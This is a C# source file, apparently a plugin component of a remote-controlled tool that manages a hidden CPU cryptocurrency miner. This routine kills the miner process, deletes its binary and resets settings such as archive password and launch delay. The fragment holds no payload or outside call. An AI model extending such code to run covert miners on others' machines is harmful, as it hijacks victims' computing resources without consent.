using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
namespace Plugin
{
    class Cpu_Del
    {
        public static void Get()
        {
            try
            {
                if (File.Exists(Properties.CPU.Default.cpuBin))
                    foreach (Process p in Process.GetProcessesByName(Properties.CPU.Default.cpuProc))
                    {
                        p.Kill();
                        Thread.Sleep(2000);
                    }

                if (File.Exists(Properties.CPU.Default.cpuBin))
                    File.Delete(Properties.CPU.Default.cpuBin);
                if (!File.Exists(Properties.CPU.Default.cpuBin))
                    Properties.CPU.Default.cpuParametrs = "1"; // Launch parameters
                Properties.CPU.Default.cpuProc = "1"; // In the archive
                Properties.CPU.Default.cpuWorkDir = "1";
                Properties.CPU.Default.cpuZipPass = "1";
                Properties.CPU.Default.cpuDelay = "1";
                Properties.CPU.Default.cpuBin = "1";
                Properties.CPU.Default.cpu_idParameters = "0";
                Properties.CPU.Default.Save(); // Save, then manipulate only them
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
                return;
            }
        }
    }
}
